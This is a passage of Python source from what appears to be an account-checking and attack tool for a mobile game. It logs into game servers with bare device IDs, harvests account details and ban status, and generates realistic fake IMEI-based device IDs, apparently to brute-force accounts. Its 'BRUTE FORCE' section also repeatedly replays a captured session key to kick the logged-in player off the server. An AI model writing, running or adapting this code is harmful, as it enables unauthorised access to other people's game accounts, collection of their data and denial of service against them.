        if t117 is not None:
            raw = t117.get(0, 0) if isinstance(t117, dict) else (int(t117) if isinstance(t117, int) else 0)
            pct = round((int(raw)+1)/7*100, 1)
            if pct < 30: restriction_flags = f"{pct}% Low Risk ✅"
            elif pct < 60: restriction_flags = f"{pct}% Medium Risk ⚠️"
            else: restriction_flags = f"{pct}% High Risk 🚨"
        min_ts = 1451577600
        create_ts_fb = pd.get(6, 0)
        if creation_ts and creation_ts >= min_ts: creation_date = fmt_ts_full(creation_ts)
        elif create_ts_fb and create_ts_fb >= min_ts: creation_date = fmt_ts_full(create_ts_fb)
        else: creation_date = "N/A"
        account_age = "N/A"
        age_ts = creation_ts if (creation_ts and creation_ts >= min_ts) else \
                 (create_ts_fb if (create_ts_fb and create_ts_fb >= min_ts) else 0)
        if age_ts:
            now = datetime.datetime.now(datetime.timezone.utc)
            cd = datetime.datetime.fromtimestamp(age_ts, datetime.timezone.utc)
            d = now - cd
            y, m, dd = d.days//365, (d.days%365)//30, d.days%30
            account_age = f"{y}y {m}m {dd}d" if y else (f"{m}m {dd}d" if m else f"{d.days}d")
        win = int(pd.get(18, 0) or 0)
        loss = int(pd.get(155, 0) or 0)
        total_wl = win + loss
        win_rate = f"{win/total_wl*100:.2f}%" if total_wl > 0 else "N/A"
        t91 = pd.get(91, [])
        hero_hist = []
        if isinstance(t91, list):
            seen = set()
            for hid in t91:
                try: hi = int(hid)
                except Exception: continue
                if hi in seen: continue
                seen.add(hi); hero_hist.append(hero_name(hi))
                if len(hero_hist) >= 5: break
        v2l_status = "N/A"
        if v2l_data and isinstance(v2l_data, dict):
            src = v2l_data.get("src"); data = v2l_data.get("data", {})
            for t in ((10,11) if src == 10208 else (0,2,3,5)):
                v = data.get(t)
                if v is not None:
                    try:
                        v2l_status = "Enabled" if int(v) > 0 else "Disabled"; break
                    except Exception: pass
        emblem_levels = None
        if role_info and isinstance(role_info, dict):
            t101 = role_info.get(101, {})
            if isinstance(t101, dict) and t101:
                parts = [f"{EMBLEM_MAP.get(int(e), f'E{e}')}:Lv{t101[e]}" for e in sorted(t101.keys())]
                emblem_levels = ", ".join(parts)
        diamonds = 0; bp = 0
        if role_info and isinstance(role_info, dict):
            cur = role_info.get(111)
            if isinstance(cur, dict):
                diamonds = int(cur.get(0, 0) or 0); bp = int(cur.get(1, 0) or 0)
            elif isinstance(cur, int): diamonds = int(cur)
        if not bp: bp = int(pd.get(83, 0) or 0)
        tickets = 0
        if role_info and isinstance(role_info, dict): tickets = role_info.get(49, 0)
        if not tickets: tickets = pd.get(49, 0)
        return {
            "nickname": nickname, "player_id": player_id, "server": server, "level": level,
            "skin_count": skin_count, "hero_count": hero_count,
            "total_battles": total_battles, "rating_score": rating_score,
            "achievement_points": achievement_points,
            "last_login": last_login, "last_login_ts": last_login_ts,
            "last_login_country": last_login_country, "create_country": create_country,
            "location": location, "high_rank": hr, "current_rank": cr,
            "collector_point": cpt, "collector_tier": ctier,
            "squad": squad, "squad_id": squad_id,
            "skin_breakdown": skin_breakdown, "affinity": affinity,
            "likes": likes, "followers": followers, "popularity": popularity, "bio": bio,
            "credits_score": credits, "restriction_flags": restriction_flags,
            "latest_skin_date": latest_skin_date, "latest_skin_id": latest_skin_id,
            "starlight_user": starlight_user, "starlight_expiry": starlight_expiry,
            "starlight_months": starlight_months if starlight_months else None,
            "creation_date": creation_date, "account_age": account_age,
            "win_rate": win_rate, "hero_history": hero_hist,
            "v2l_status": v2l_status,
            "battle_points": bp if bp else None,
            "diamonds": diamonds if diamonds else None,
            "tickets": tickets if tickets else None,
            "emblem_levels": emblem_levels,
        }
    except Exception as e:
        logging.debug("extract error: %s", e); return None

# ============================================================
# FAILURE CLASSIFIERS
# ============================================================
_PERMANENT_FAILURES = ("guest / unregistered", "invalid format")
def _is_permanent_failure(err: str) -> bool:
    e = (err or "").lower()
    return any(p in e for p in _PERMANENT_FAILURES)

# ============================================================
# PUBLIC API
# ============================================================
def check_device_id(device_id: str, retries: int = None) -> Dict[str, Any]:
    if retries is None: retries = CHECK_RETRIES
    device_id = (device_id or "").strip()
    ok, reason = validate_device_id(device_id)
    if not ok:
        return {"status": "error", "device_id": device_id,
                "error": f"Invalid format: {reason}", "permanent": True}

    last_err = "unknown"
    for attempt in range(retries):
        conn = None
        try:
            conn = _setup_connection(device_id)
            result = conn.lookup_player(conn.account_id)
            if not result and attempt < retries - 1:
                try: conn.cleanup()
                except Exception: pass
                last_err = "No account data returned"
                time.sleep(RETRY_BACKOFF[min(attempt, len(RETRY_BACKOFF)-1)])
                continue
            if not result:
                try: conn.cleanup()
                except Exception: pass
                return {"status": "error", "device_id": device_id,
                        "error": "No account data returned", "permanent": True}
            rid = result[0][0].get(0) if (result and result[0]) else conn.account_id
            zid = result[0][0].get(1, conn.zone_id) if (result and result[0]) else conn.zone_id
            role_info = conn.get_role_info(rid, zid)
            skin_info = conn.get_skin_role_info(rid, zid)
            if skin_info and isinstance(skin_info, dict):
                if role_info is None: role_info = {}
                for k, v in skin_info.items(): role_info[k] = v
            v2l_data = conn.get_v2l_status(rid, zid)
            creation_ts = conn.creation_ts
            conn.cleanup()
            player = extract_player_data(result, role_info=role_info,
                                          creation_ts=creation_ts, v2l_data=v2l_data)
            if not player:
                last_err = "Could not parse player data"
                time.sleep(RETRY_BACKOFF[min(attempt, len(RETRY_BACKOFF)-1)])
                continue
            return {"status": "success", "device_id": device_id, "player_data": player}
        except ConnectionError as e:
            last_err = str(e)
            if conn:
                try: conn.cleanup()
                except Exception: pass
            if _is_permanent_failure(last_err):
                return {"status": "error", "device_id": device_id,
                        "error": last_err, "permanent": True}
            time.sleep(RETRY_BACKOFF[min(attempt, len(RETRY_BACKOFF)-1)])
            continue
        except Exception as e:
            last_err = f"{type(e).__name__}: {e}"
            if conn:
                try: conn.cleanup()
                except Exception: pass
            time.sleep(RETRY_BACKOFF[min(attempt, len(RETRY_BACKOFF)-1)])
            continue
    return {"status": "error", "device_id": device_id, "error": last_err, "permanent": False}


def check_ban_only(device_id: str, retries: int = None) -> Dict[str, Any]:
    """
    Ban check via shin.py method:
      setup (login + get_server + handshake) → same-socket check_ban_status()
    No reconnect. Faster than any previous version.
    """
    if retries is None: retries = CHECK_RETRIES
    device_id = (device_id or "").strip()
    ok, reason = validate_device_id(device_id)
    if not ok:
        return {"status": "error", "device_id": device_id, "permanent": True,
                "error": f"Invalid format: {reason}",
                "ban": {"banned": False, "state": "invalid", "label": "INVALID"}}

    last_ban = None
    last_err = "unknown"

    for attempt in range(retries):
        conn = None
        try:
            conn = GameConnection(device_id)
            conn.connect()

            if not conn.login_to_login_server():
                if conn.is_guest:
                    conn.cleanup()
                    return {"status": "error", "device_id": device_id, "permanent": True,
                            "error": "Guest / unregistered device",
                            "ban": {"banned": False, "state": "unregistered",
                                    "label": "UNREGISTERED"}}
                last_err = "Login failed"
                conn.cleanup()
                time.sleep(RETRY_BACKOFF[min(attempt, len(RETRY_BACKOFF)-1)])
                continue

            if not conn.get_game_server():
                last_err = "Server resolve failed"
                conn.cleanup()
                time.sleep(RETRY_BACKOFF[min(attempt, len(RETRY_BACKOFF)-1)])
                continue

            if not conn.connect_to_game_server():
                last_err = "Handshake failed"
                conn.cleanup()
                time.sleep(RETRY_BACKOFF[min(attempt, len(RETRY_BACKOFF)-1)])
                continue

            # Same socket — no reconnect — directly query ban
            ban = conn.check_ban_status()
            conn.cleanup()
            last_ban = ban

            # If unknown and retries remain → back off and retry
            if ban.get("state") == "unknown" and attempt < retries - 1:
                last_err = ban.get("label", "unknown")
                time.sleep(RETRY_BACKOFF[min(attempt, len(RETRY_BACKOFF)-1)])
                continue

            return {"status": "success", "device_id": device_id, "ban": ban}

        except ConnectionError as e:
            last_err = str(e)
            if conn:
                try: conn.cleanup()
                except Exception: pass
            if _is_permanent_failure(last_err):
                return {"status": "error", "device_id": device_id, "permanent": True,
                        "error": last_err,
                        "ban": {"banned": False, "state": "unregistered",
                                "label": "UNREGISTERED"}}
            time.sleep(RETRY_BACKOFF[min(attempt, len(RETRY_BACKOFF)-1)])
            continue
        except Exception as e:
            last_err = f"{type(e).__name__}: {e}"
            if conn:
                try: conn.cleanup()
                except Exception: pass
            time.sleep(RETRY_BACKOFF[min(attempt, len(RETRY_BACKOFF)-1)])
            continue

    if last_ban is not None:
        return {"status": "success", "device_id": device_id, "ban": last_ban}
    return {"status": "error", "device_id": device_id, "error": last_err, "permanent": False,
            "ban": {"banned": False, "state": "unknown", "reason": "", "remaining": "",
                    "label": "CHECK FAILED"}}


# ============================================================
# BRUTE FORCE
# ============================================================
def fetch_session_profile(device_id, stop_event=None) -> Optional[Dict[str, Any]]:
    try:
        conn = GameConnection(device_id, stop_event=stop_event)
        if not conn.login_to_login_server(): conn.cleanup(); return None
        if not conn.get_game_server(): conn.cleanup(); return None
        if not conn.connect_to_game_server(): conn.cleanup(); return None
        result = conn.lookup_player(conn.account_id)
        pd = extract_player_data(result) if result else {}
        pd = pd or {}
        profile = {
            "device_id":   device_id,
            "account_id":  conn.account_id,
            "zone_id":     conn.zone_id,
            "session_key": conn.session_key,
            "game_host":   conn.game_host,
            "game_port":   conn.game_port,
            "gs_info":     f"{conn.game_host}:{conn.game_port}",
            "nickname":    pd.get("nickname") or f"Player_{conn.account_id}",
            "level":       pd.get("level", 1),
            "rank":        pd.get("current_rank") or "Unranked",
            "skin_count":  pd.get("skin_count", 0),
            "hero_count":  pd.get("hero_count", 0),
            "platform":    conn.platform,
            "channel":     conn.channel,
        }
        conn.cleanup()
        return profile
    except Exception as e:
        logging.debug("fetch_session_profile error: %s", e); return None

def send_session_kick(profile, timeout=5.0) -> Tuple[bool, float, str]:
    t0 = time.time(); sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile["game_host"], profile["game_port"]))
        channel = profile.get("channel") or (
            CHANNEL_IOS if detect_platform(profile["device_id"]) == "ios" else CHANNEL_AND)
        body = SdpStruct({
            0: profile["account_id"], 1: profile["session_key"],
            2: profile["zone_id"], 4: CLIENT_VERSION,
            13: channel, 15: profile["device_id"]}).data
        pkt = SdpStruct({0: 10001, 1: 1, 5: body}).data
        comp = zstd.compress(pkt)
        sock.sendall(((len(comp)+4) | (16<<24)).to_bytes(4, "big") + comp)
        q = b""
        while len(q) < 4:
            d = sock.recv(4096)
            if not d: break
            q += d
        try: sock.close()
        except Exception: pass
        return True, (time.time()-t0)*1000, "OK"
    except socket.timeout:
        if sock:
            try: sock.close()
            except Exception: pass
        return False, (time.time()-t0)*1000, "TIMEOUT"
    except Exception as e:
        if sock:
            try: sock.close()
            except Exception: pass
        return False, (time.time()-t0)*1000, str(e)


def kick_device(device_id, rounds=0, delay=3.0, stop_event=None, on_progress=None):
    device_id = (device_id or "").strip()
    stats = {"attempts":0, "hits":0, "fails":0, "elapsed":0.0,
             "device_id": device_id, "rounds_target": rounds,
             "status": "fetching", "avg_latency": 0.0,
             "nickname":"?", "gs_info":"?", "account_id":"?"}
    t0 = time.time()
    ok, reason = validate_device_id(device_id)
    if not ok:
        stats["status"] = "error"; stats["error"] = f"Invalid format: {reason}"
        stats["elapsed"] = time.time()-t0; return stats
    if on_progress:
        try: on_progress(dict(stats))
        except Exception: pass
    profile = fetch_session_profile(device_id, stop_event=stop_event)
    if not profile:
        stats["status"] = "error"; stats["error"] = "Failed to fetch session profile"
        stats["elapsed"] = time.time()-t0
        if on_progress:
            try: on_progress(dict(stats))
            except Exception: pass
        return stats
    stats.update({"nickname": profile.get("nickname","?"),
                  "gs_info": profile.get("gs_info","?"),
                  "account_id": profile.get("account_id","?"),
                  "status": "running"})
    if on_progress:
        try: on_progress(dict(stats))
        except Exception: pass
    latencies = []; i = 0
    while True:
        if stop_event is not None and stop_event.is_set(): break
        if rounds > 0 and i >= rounds: break
        ok, lat, _ = send_session_kick(profile)
        latencies.append(lat)
        if ok: stats["hits"] += 1
        else: stats["fails"] += 1
        stats["attempts"] += 1
        stats["elapsed"] = time.time()-t0
        if latencies: stats["avg_latency"] = sum(latencies)/len(latencies)
        if on_progress:
            try: on_progress(dict(stats))
            except Exception: pass
        i += 1
        if stop_event is not None:
            if stop_event.wait(timeout=delay): break
        else: time.sleep(delay)
    stats["elapsed"] = time.time()-t0
    stats["status"] = "stopped" if (stop_event is not None and stop_event.is_set()) else "success"
    return stats

# ---------------- Helpers ----------------
IMEI_TAC = ["354280","353285","354069","354285","353166","354430","352609","353328",
            "354255","353347","354490","352994","353167","356938","864893","864394",
            "359250","359251","868000","867000","355000","356000","358000","359000"]
def _luhn(n: str) -> int:
    digits = [int(d) for d in n]
    odd, even = digits[-1::-2], digits[-2::-2]
    total = sum(odd) + sum(sum(divmod(d*2, 10)) for d in even)
    return (10 - total % 10) % 10
def _realistic_imei() -> str:
    tac = random.choice(IMEI_TAC)
    serial = f"{random.randint(0, 999999):06d}"
    partial = tac + serial
    return partial + str(_luhn(partial))

def generate_device_ids(count: int) -> List[str]:
    out = []
    for _ in range(count):
        md5 = hashlib.md5(_realistic_imei().encode()).hexdigest()
        aid = secrets.token_hex(8)
        adv = str(uuid.uuid4())
        out.append(f"and_{md5}{aid}{adv}")
    return out

def read_ids_from_text(text: str) -> List[str]:
    out = []
    for line in text.splitlines():
        r = line.strip()
        if r and not r.startswith("#"): out.append(r)
    return out

def save_line(did: str, p: Dict[str, Any]) -> str:
    hh = p.get("hero_history") or []
    lh = hh[0] if hh else "N/A"
    return (f"Device ID: {did} | Name: {p.get('nickname','N/A')} | Role ID: {p.get('player_id','N/A')} | "
            f"Server ID: {p.get('server','N/A')} | Level: {p.get('level','N/A')} | "
            f"Skin: {p.get('skin_count','N/A')} | Collector: {p.get('collector_tier','None')} | "
            f"Rank: {p.get('current_rank','N/A')} | Heroes: {p.get('hero_count',0)} | "
            f"Matches: {p.get('total_battles',0)} | WR: {p.get('win_rate','N/A')} | "
            f"Last Login: {p.get('last_login','N/A')} | Last Hero: {lh}")

def save_ban_line(did: str, ban: Dict[str, Any]) -> str:
    state = ban.get("state", "")
    if ban.get("banned"):
        return (f"{did} | BANNED | Reason: {ban.get('reason','?')} "
                f"| Remaining: {ban.get('remaining','?')}")
    if state == "unknown":
        return f"{did} | UNKNOWN | {ban.get('label','could not determine')}"
    if state == "unregistered":
        return f"{did} | UNREGISTERED"
    return f"{did} | NOT BANNED"
